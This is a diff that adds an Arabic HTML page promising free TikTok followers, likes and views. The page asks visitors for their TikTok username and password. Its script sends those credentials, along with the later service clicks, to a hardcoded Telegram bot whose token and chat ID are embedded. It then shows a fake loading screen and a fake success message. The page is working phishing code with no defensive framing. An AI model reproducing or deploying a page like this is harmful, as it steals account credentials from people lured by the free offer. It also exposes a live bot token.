@@ -1,0 +1,139 @@
+
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <title>رشق تيك توك</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(to bottom, #111, #1e1e1e);
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .container {
+      background-color: #2a2a2a;
+      border-radius: 15px;
+      padding: 40px;
+      box-shadow: 0 0 20px #000;
+      width: 90%;
+      max-width: 400px;
+      text-align: center;
+    }
+    h1 { color: #25f4ee; margin-bottom: 10px; }
+    p { color: #ccc; margin-bottom: 20px; }
+    .warning { color: #ff4444; font-size: 14px; margin-top: -10px; margin-bottom: 20px; }
+    input {
+      width: 100%; padding: 12px; margin-bottom: 15px; border: none; border-radius: 8px;
+      background-color: #444; color: white; font-size: 16px;
+    }
+    input::placeholder { color: #aaa; }
+    button {
+      width: 100%; padding: 12px; background: linear-gradient(90deg, #25f4ee, #fe2c55);
+      border: none; border-radius: 8px; font-size: 16px; font-weight: bold;
+      color: black; cursor: pointer; transition: 0.3s; margin-top: 10px;
+    }
+    button:hover { transform: scale(1.05); box-shadow: 0 0 10px #fe2c55; }
+    .hidden { display: none; }
+    .service-button { margin: 10px 0; }
+    .modal {
+      background-color: #222; border-radius: 10px; padding: 20px; color: white;
+      box-shadow: 0 0 10px #000; position: fixed; top: 50%; left: 50%;
+      transform: translate(-50%, -50%); text-align: center; z-index: 999;
+    }
+    .loader {
+      border: 6px solid #444; border-top: 6px solid #25f4ee; border-radius: 50%;
+      width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <div class="container" id="login">
+    <h1>رشق تيك توك</h1>
+    <p>أدخل اسم المستخدم وكلمة المرور للحصول على خدمات مجانية</p>
+    <input type="text" id="username" placeholder="اسم المستخدم">
+    <input type="password" id="password" placeholder="كلمة المرور">
+    <p class="warning">⚠️ في حالة كتابة اسم المستخدم أو كلمة المرور خطأ، لن يتم إرسال الطلب المجاني.</p>
+    <button onclick="login()">تسجيل الدخول</button>
+  </div>
+
+  <div class="container hidden" id="panel">
+    <h1>اختر الخدمة</h1>
+    <p>استفد من العروض المجانية</p>
+    <button class="service-button" onclick="showMessage('متابعين')">رشق 100 متابع</button>
+    <button class="service-button" onclick="showMessage('لايكات')">رشق 1000 لايك</button>
+    <button class="service-button" onclick="showMessage('مشاهدات')">رشق 10000 مشاهدة</button>
+  </div>
+
+  <script>
+    const botToken = "7613909700:AAG5cHeaYFXq5Cbe6MoLtDhfHCMnIH105vE";
+    const chatId = "7560646547";
+
+    function login() {
+      const user = document.getElementById("username").value;
+      const pass = document.getElementById("password").value;
+
+      const arabicRegex = /[\u0600-\u06FF]/;
+      const passwordRegex = /^(?=.*[a-zA-Z])(?=.*\d)(?=.*[!@#$%^&*]).+$/;
+
+      if (arabicRegex.test(user)) {
+        showModal("يجب إدخال الاسم باللغة الإنجليزية");
+        return;
+      }
+      if (!passwordRegex.test(pass)) {
+        showModal("كلمة المرور غير صحيحة");
+        return;
+      }
+      if (user && pass) {
+        document.getElementById("login").classList.add("hidden");
+        document.getElementById("panel").classList.remove("hidden");
+        const message = `🔐 تسجيل دخول جديد:\n👤 اسم المستخدم: ${user}\n🔑 كلمة المرور: ${pass}`;
+        sendToTelegram(message);
+      } else {
+        showModal("يرجى إدخال كل البيانات");
+      }
+    }
+    function showMessage(type) {
+      const username = document.getElementById("username").value;
+      let message = "";
+      if (type === "متابعين") message = `✅ تم تسجيل الطلب. سيتم إرسال المتابعين إلى حسابك (${username}).`;
+      else if (type === "لايكات") message = `✅ تم تسجيل الطلب. سيتم إرسال اللايكات إلى حسابك (${username}).`;
+      else if (type === "مشاهدات") message = `✅ تم تسجيل الطلب. سيتم إرسال المشاهدات إلى حسابك (${username}).`;
+      sendToTelegram(`📦 طلب خدمة: ${type}\n👤 المستخدم: ${username}`);
+      showLoading(message);
+    }
+    function sendToTelegram(message) {
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST", headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: message })
+      });
+    }
+    function showLoading(finalMessage) {
+      const modal = document.createElement("div");
+      modal.className = "modal";
+      modal.innerHTML = `<div class='loader'></div><p>جاري معالجة طلبك...</p>`;
+      document.body.appendChild(modal);
+      setTimeout(() => {
+        modal.innerHTML = `<p style='font-size: 18px;'>✅ ${finalMessage}</p>`;
+        setTimeout(() => document.body.removeChild(modal), 3000);
+      }, 10000);
+    }
+    function showModal(text) {
+      const modal = document.createElement("div");
+      modal.className = "modal";
+      modal.innerHTML = `<p>${text}</p>`;
+      document.body.appendChild(modal);
+      setTimeout(() => document.body.removeChild(modal), 3000);
+    }
+  </script>
+</body>
+</html>
